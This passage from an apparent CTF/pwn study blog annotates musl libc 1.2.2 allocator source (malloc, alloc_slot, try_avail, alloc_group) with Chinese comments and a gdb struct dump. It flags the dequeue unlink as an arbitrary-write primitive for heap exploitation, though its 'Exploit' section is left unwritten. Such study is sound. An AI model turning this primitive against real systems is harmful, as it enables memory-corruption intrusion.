class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> n)</span><br>&#123;<br><span class="hljs-keyword">if</span> (size_overflows(n)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">g</span>;</span><br><span class="hljs-type">uint32_t</span> mask, first;<br><span class="hljs-type">int</span> sc;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">int</span> ctr;<br><span class="hljs-comment">// #define MMAP_THRESHOLD 131052</span><br><span class="hljs-comment">// #define UNIT 16</span><br><span class="hljs-comment">// #define IB 4</span><br><span class="hljs-comment">// 如果走 mmap 分配（跳过）</span><br><span class="hljs-comment">/**************************************************************/</span><br><span class="hljs-keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;<br><span class="hljs-type">size_t</span> needed = n + IB + UNIT;<br><span class="hljs-type">void</span> *p = mmap(<span class="hljs-number">0</span>, needed, PROT_READ|PROT_WRITE,<br>MAP_PRIVATE|MAP_ANON, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (p==MAP_FAILED) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>wrlock();<br>step_seq();<br>g = alloc_meta();<br><span class="hljs-keyword">if</span> (!g) &#123;<br>unlock();<br>munmap(p, needed);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>g-&gt;mem = p;<br>g-&gt;mem-&gt;meta = g;<br>g-&gt;last_idx = <span class="hljs-number">0</span>;<br>g-&gt;freeable = <span class="hljs-number">1</span>;<br>g-&gt;sizeclass = <span class="hljs-number">63</span>;<br>g-&gt;maplen = (needed+<span class="hljs-number">4095</span>)/<span class="hljs-number">4096</span>;<br>g-&gt;avail_mask = g-&gt;freed_mask = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// use a global counter to cycle offset in</span><br><span class="hljs-comment">// individually-mmapped allocations.</span><br>ctx.mmap_counter++;<br>idx = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> success;<br>&#125;<br><span class="hljs-comment">/**************************************************************/</span><br><br>    <span class="hljs-comment">// 不走 mmap 则</span><br>sc = size_to_class(n);<br>rdlock();<br>g = ctx.active[sc];  <span class="hljs-comment">// 查找缓存 &quot;bins&quot; ，拿到 meta *g</span><br><br><span class="hljs-comment">// meta 为空且 4 =&lt; sc &lt;= 32 且不等于 6 且为偶数并且该 sc 没有正在使用的 chunk（?）</span><br><span class="hljs-comment">/**************************************************************/</span><br><span class="hljs-comment">// use coarse size classes initially when there are not yet</span><br><span class="hljs-comment">// any groups of desired size. this allows counts of 2 or 3</span><br><span class="hljs-comment">// to be allocated at first rather than having to start with</span><br><span class="hljs-comment">// 7 or 5, the min counts for even size classes.</span><br><span class="hljs-keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="hljs-number">4</span> &amp;&amp; sc&lt;<span class="hljs-number">32</span> &amp;&amp; sc!=<span class="hljs-number">6</span> &amp;&amp; !(sc&amp;<span class="hljs-number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;<br><span class="hljs-type">size_t</span> usage = ctx.usage_by_class[sc|<span class="hljs-number">1</span>];<br><span class="hljs-comment">// if a new group may be allocated, count it toward</span><br><span class="hljs-comment">// usage in deciding if we can use coarse class.</span><br><span class="hljs-keyword">if</span> (!ctx.active[sc|<span class="hljs-number">1</span>] || (!ctx.active[sc|<span class="hljs-number">1</span>]-&gt;avail_mask<br>    &amp;&amp; !ctx.active[sc|<span class="hljs-number">1</span>]-&gt;freed_mask))<br>usage += <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (usage &lt;= <span class="hljs-number">12</span>)<br>sc |= <span class="hljs-number">1</span>;<br>g = ctx.active[sc];<br>&#125;<br><span class="hljs-comment">/**************************************************************/</span><br><br><span class="hljs-keyword">for</span> (;;) &#123;<br>mask = g ? g-&gt;avail_mask : <span class="hljs-number">0</span>;<br>first = mask&amp;-mask;     <span class="hljs-comment">// 找到最低的为 1 的 bit 位</span><br><span class="hljs-keyword">if</span> (!first) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 没有 avail 的 chunk ， break</span><br><span class="hljs-keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)<br>g-&gt;avail_mask = mask-first;     <span class="hljs-comment">// 把 avail 这个 bit 置零 ， 为分配 chunk 做准备</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)<br><span class="hljs-keyword">continue</span>;<br>idx = a_ctz_32(first);  <span class="hljs-comment">// 计算 group 中的 chunk 下标</span><br><span class="hljs-keyword">goto</span> success;   <span class="hljs-comment">// 跳到分配 chunk</span><br>&#125;<br>upgradelock();<br><br>    <span class="hljs-comment">// 如果缓存中没有 avial 的 chunk ， 进一步申请</span><br>idx = alloc_slot(sc, n);<br><span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span>) &#123;<br>unlock();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>g = ctx.active[sc];     <span class="hljs-comment">// 刷新 g</span><br><br>success:<br>ctr = ctx.mmap_counter;<br>unlock();<br><span class="hljs-keyword">return</span> enframe(g, idx, n, ctr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="alloc-slot"><a class="header-anchor" href="#alloc-slot">¶</a>alloc_slot</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 当 malloc 时初步发现 ctx.active[sc] 没有 avail 的 chunk</span><br><span class="hljs-comment">// sc = size_to_class(n); req 是请求分配的大小</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">alloc_slot</span><span class="hljs-params">(<span class="hljs-type">int</span> sc, <span class="hljs-type">size_t</span> req)</span><br>&#123;<br>    <span class="hljs-comment">// 详细检查一下缓存(可能有 freed mask 或者 meta.next 有可分配的)</span><br><span class="hljs-type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);<br><span class="hljs-keyword">if</span> (first) <span class="hljs-keyword">return</span> a_ctz_32(first);  <span class="hljs-comment">// 分配成功 return</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">g</span> =</span> alloc_group(sc, req);  <span class="hljs-comment">// 进一步申请，全新的 meta 与 group</span><br><span class="hljs-keyword">if</span> (!g) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>g-&gt;avail_mask--;<br><span class="hljs-built_in">queue</span>(&amp;ctx.active[sc], g);  <span class="hljs-comment">// 加入缓存 &quot;bins&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="try-avail"><a class="header-anchor" href="#try-avail">¶</a>try_avail</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// try_avail(&amp;ctx.active[sc])</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title function_">try_avail</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **pm)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">m</span> =</span> *pm;<br><span class="hljs-type">uint32_t</span> first;<br><span class="hljs-keyword">if</span> (!m) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-type">uint32_t</span> mask = m-&gt;avail_mask;<br><span class="hljs-keyword">if</span> (!mask) &#123;    <span class="hljs-comment">// 没有 avail</span><br><span class="hljs-keyword">if</span> (!m-&gt;freed_mask) &#123;   <span class="hljs-comment">// 没有 free 的 chunk ， meta 的 group 中所有的 chunk 都分配出去了</span><br>dequeue(pm, m);     <span class="hljs-comment">// meta UNLINK , UNSAFE UNLINK!!! 任意写漏洞</span><br>m = *pm;<br><span class="hljs-keyword">if</span> (!m) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m = m-&gt;next;    <span class="hljs-comment">// 找下一个，如果没有下一个指向自己（循环链表）</span><br>*pm = m;<br>&#125;<br><br>mask = m-&gt;freed_mask;<br><br><span class="hljs-comment">// skip fully-free group unless it&#x27;s the only one</span><br><span class="hljs-comment">// or it&#x27;s a permanently non-freeable group</span><br><span class="hljs-keyword">if</span> (mask == (<span class="hljs-number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="hljs-number">-1</span> &amp;&amp; m-&gt;freeable) &#123;<br>m = m-&gt;next;<br>*pm = m;<br>mask = m-&gt;freed_mask;<br>&#125;<br><br><span class="hljs-comment">// activate more slots in a not-fully-active group</span><br><span class="hljs-comment">// if needed, but only as a last resort. prefer using</span><br><span class="hljs-comment">// any other group with free slots. this avoids</span><br><span class="hljs-comment">// touching &amp; dirtying as-yet-unused pages.</span><br><span class="hljs-keyword">if</span> (!(mask &amp; ((<span class="hljs-number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="hljs-number">-1</span>))) &#123;<br><span class="hljs-keyword">if</span> (m-&gt;next != m) &#123;<br>m = m-&gt;next;<br>*pm = m;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;<br><span class="hljs-type">int</span> span = UNIT + size*cnt;<br><span class="hljs-comment">// activate up to next 4k boundary</span><br><span class="hljs-keyword">while</span> ((span^(span+size<span class="hljs-number">-1</span>)) &lt; <span class="hljs-number">4096</span>) &#123;<br>cnt++;<br>span += size;<br>&#125;<br><span class="hljs-keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="hljs-number">1</span>)<br>cnt = m-&gt;last_idx+<span class="hljs-number">1</span>;<br>m-&gt;mem-&gt;active_idx = cnt<span class="hljs-number">-1</span>;<br>&#125;<br>&#125;<br>mask = activate_group(m);<br>assert(mask);<br>decay_bounces(m-&gt;sizeclass);<br>&#125;<br>    <span class="hljs-comment">// 提取出 avail 的第一个 chunk 对应的 mask ，return</span><br>first = mask&amp;-mask;<br>m-&gt;avail_mask = mask-first;<br><span class="hljs-keyword">return</span> first;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="alloc-slot-v2"><a class="header-anchor" href="#alloc-slot-v2">¶</a>alloc_slot</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">alloc_slot</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">size_t</span>)</span>;<br><br><span class="hljs-comment">// struct meta *g = alloc_group(sc, req);  // 进一步申请，全新的 meta 与 group</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> meta *<span class="hljs-title function_">alloc_group</span><span class="hljs-params">(<span class="hljs-type">int</span> sc, <span class="hljs-type">size_t</span> req)</span><br>&#123;<br><span class="hljs-type">size_t</span> size = UNIT*size_classes[sc];<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, cnt;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *p;<br><br>    <span class="hljs-comment">// 分配全新的 meta</span><br>    <span class="hljs-comment">// 优先查看 ctx.free_meta_head 链表，如果没有</span><br>    <span class="hljs-comment">// 再查看  ctx 管理的 main_are 是否有剩的 meta，是否有其他的 meta_area ，如果都没有</span><br>    <span class="hljs-comment">// 尝试用 brk() 以内存页为标准分配堆，会中间多分配一个无读写权限的内存页，作为 guard</span><br>    <span class="hljs-comment">// brk() 失败会尝试用 mmap()</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">m</span> =</span> alloc_meta();<br><span class="hljs-keyword">if</span> (!m) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> usage = ctx.usage_by_class[sc];<br><span class="hljs-comment">// 给 cnt 赋值，mmap，跳过</span><br><span class="hljs-comment">/**************************************************************************/</span><br><span class="hljs-type">size_t</span> pagesize = PGSZ;<br><span class="hljs-type">int</span> active_idx;<br><span class="hljs-keyword">if</span> (sc &lt; <span class="hljs-number">9</span>) &#123;<br><span class="hljs-keyword">while</span> (i&lt;<span class="hljs-number">2</span> &amp;&amp; <span class="hljs-number">4</span>*small_cnt_tab[sc][i] &gt; usage)<br>i++;<br>cnt = small_cnt_tab[sc][i];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// lookup max number of slots fitting in power-of-two size</span><br><span class="hljs-comment">// from a table, along with number of factors of two we</span><br><span class="hljs-comment">// can divide out without a remainder or reaching 1.</span><br>cnt = med_cnt_tab[sc&amp;<span class="hljs-number">3</span>];<br><br><span class="hljs-comment">// reduce cnt to avoid excessive eagar allocation.</span><br><span class="hljs-keyword">while</span> (!(cnt&amp;<span class="hljs-number">1</span>) &amp;&amp; <span class="hljs-number">4</span>*cnt &gt; usage)<br>cnt &gt;&gt;= <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// data structures don&#x27;t support groups whose slot offsets</span><br><span class="hljs-comment">// in units don&#x27;t fit in 16 bits.</span><br><span class="hljs-keyword">while</span> (size*cnt &gt;= <span class="hljs-number">65536</span>*UNIT)<br>cnt &gt;&gt;= <span class="hljs-number">1</span>;<br>&#125;<br><br>    <span class="hljs-comment">// 需求比较大的时候调用 mmap 分配</span><br><span class="hljs-comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span><br><span class="hljs-comment">// mmap, increase to 2. Then it might be; if not it will nest.</span><br><span class="hljs-keyword">if</span> (cnt==<span class="hljs-number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="hljs-number">2</span>) cnt = <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span><br><span class="hljs-comment">// larger than half the page size should be allocated as whole pages.</span><br><span class="hljs-keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="hljs-number">2</span>) &#123;<br><span class="hljs-comment">// check/update bounce counter to start/increase retention</span><br><span class="hljs-comment">// of freed maps, and inhibit use of low-count, odd-size</span><br><span class="hljs-comment">// small mappings and single-slot groups if activated.</span><br><span class="hljs-type">int</span> nosmall = is_bouncing(sc);<br>account_bounce(sc);<br>step_seq();<br><br><span class="hljs-comment">// since the following count reduction opportunities have</span><br><span class="hljs-comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span><br><span class="hljs-comment">// coarse usage as part of usage.</span><br><span class="hljs-keyword">if</span> (!(sc&amp;<span class="hljs-number">1</span>) &amp;&amp; sc&lt;<span class="hljs-number">32</span>) usage += ctx.usage_by_class[sc+<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">// try to drop to a lower count if the one found above</span><br><span class="hljs-comment">// increases usage by more than 25%. these reduced counts</span><br><span class="hljs-comment">// roughly fill an integral number of pages, just not a</span><br><span class="hljs-comment">// power of two, limiting amount of unusable space.</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sc&amp;<span class="hljs-number">3</span>)==<span class="hljs-number">1</span> &amp;&amp; size*cnt&gt;<span class="hljs-number">8</span>*pagesize) cnt = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sc&amp;<span class="hljs-number">3</span>)==<span class="hljs-number">2</span> &amp;&amp; size*cnt&gt;<span class="hljs-number">4</span>*pagesize) cnt = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sc&amp;<span class="hljs-number">3</span>)==<span class="hljs-number">0</span> &amp;&amp; size*cnt&gt;<span class="hljs-number">8</span>*pagesize) cnt = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((sc&amp;<span class="hljs-number">3</span>)==<span class="hljs-number">0</span> &amp;&amp; size*cnt&gt;<span class="hljs-number">2</span>*pagesize) cnt = <span class="hljs-number">5</span>;<br>&#125;<br><span class="hljs-type">size_t</span> needed = size*cnt + UNIT;<br>needed += -needed &amp; (pagesize<span class="hljs-number">-1</span>);<br><br><span class="hljs-comment">// produce an individually-mmapped allocation if usage is low,</span><br><span class="hljs-comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span><br><span class="hljs-comment">// or it avoids eagar slot allocation without wasting too much.</span><br><span class="hljs-keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="hljs-number">7</span>) &#123;<br>req += IB + UNIT;<br>req += -req &amp; (pagesize<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="hljs-number">4</span>*pagesize &amp;&amp; <span class="hljs-number">2</span>*cnt&gt;usage)) &#123;<br>cnt = <span class="hljs-number">1</span>;<br>needed = req;<br>&#125;<br>&#125;<br><br>p = mmap(<span class="hljs-number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (p==MAP_FAILED) &#123;<br>free_meta(m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>m-&gt;maplen = needed&gt;&gt;<span class="hljs-number">12</span>;<br>ctx.mmap_counter++;<br>active_idx = (<span class="hljs-number">4096</span>-UNIT)/size<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (active_idx &gt; cnt<span class="hljs-number">-1</span>) active_idx = cnt<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (active_idx &lt; <span class="hljs-number">0</span>) active_idx = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/**************************************************************************/</span><br>    <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">int</span> j = size_to_class(UNIT+cnt*size-IB);<br>        <span class="hljs-comment">// 又一次 alloc_slot 这是一个递归过程</span><br>        <span class="hljs-comment">// 尝试向更大的缓存要内存，更大缓存中的 chunk 会成为这里的 group</span><br><span class="hljs-type">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB);<br><span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span>) &#123;<br>free_meta(m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">g</span> =</span> ctx.active[j];<br>p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);<br>        <span class="hljs-comment">// 以上代码走了类似 malloc 的过程 ， 向更大缓存要了块 chunk</span><br>m-&gt;maplen = <span class="hljs-number">0</span>;<br>p[<span class="hljs-number">-3</span>] = (p[<span class="hljs-number">-3</span>]&amp;<span class="hljs-number">31</span>) | (<span class="hljs-number">6</span>&lt;&lt;<span class="hljs-number">5</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;=cnt; i++)<br>p[UNIT+i*size<span class="hljs-number">-4</span>] = <span class="hljs-number">0</span>;<br>active_idx = cnt<span class="hljs-number">-1</span>;<br>&#125;<br>    <span class="hljs-comment">// 加入缓存的计数</span><br>ctx.usage_by_class[sc] += cnt;<br>    <span class="hljs-comment">// 设置新 meta 的初始值</span><br>m-&gt;avail_mask = (<span class="hljs-number">2u</span>&lt;&lt;active_idx)<span class="hljs-number">-1</span>;<br>m-&gt;freed_mask = (<span class="hljs-number">2u</span>&lt;&lt;(cnt<span class="hljs-number">-1</span>))<span class="hljs-number">-1</span> - m-&gt;avail_mask;<br>m-&gt;mem = (<span class="hljs-type">void</span> *)p;<br>m-&gt;mem-&gt;meta = m;<br>m-&gt;mem-&gt;active_idx = active_idx;<br>m-&gt;last_idx = cnt<span class="hljs-number">-1</span>;<br>m-&gt;freeable = <span class="hljs-number">1</span>;<br>m-&gt;sizeclass = sc;<br><span class="hljs-keyword">return</span> m;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">$<span class="hljs-number">10</span> = &#123;                                                                                                           <br>prev = <span class="hljs-number">0x55a680b781d0</span>,                                                                                          <br>next = <span class="hljs-number">0x55a680b781d0</span>,                                                                                          <br>mem = <span class="hljs-number">0x7f3478f92c50</span>,                                                                                           <br>avail_mask = <span class="hljs-number">0</span>,                                                                                                 <br>freed_mask = <span class="hljs-number">252</span>,                                                                                               <br>last_idx = <span class="hljs-number">9</span>,                                                                                                   <br>freeable = <span class="hljs-number">1</span>,                                                                                                   <br>sizeclass = <span class="hljs-number">2</span>,                                                                                                  <br>maplen = <span class="hljs-number">0</span>                                                                                 <br></code></pre></td></tr></table></figure><h1>Exploit</h1><p>主要是 dequeque 和 FSOP 的利用，先欠着(好吧其实是太菜了不会以后学)</p><h1>参考资料</h1><p><a href="https://blog.csdn.net/easy_level1/article/details/118606424">[阅读型]新版musl libc(1.2.2)堆管理之源码剖析！- easylyou</a></p><p><a href="https://www.cjovi.icu/WP/1549.html">RCTF2021-musl-WP - chuj</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/posts/341e3484.html"/>
    <url>/posts/341e3484.html</url>
    
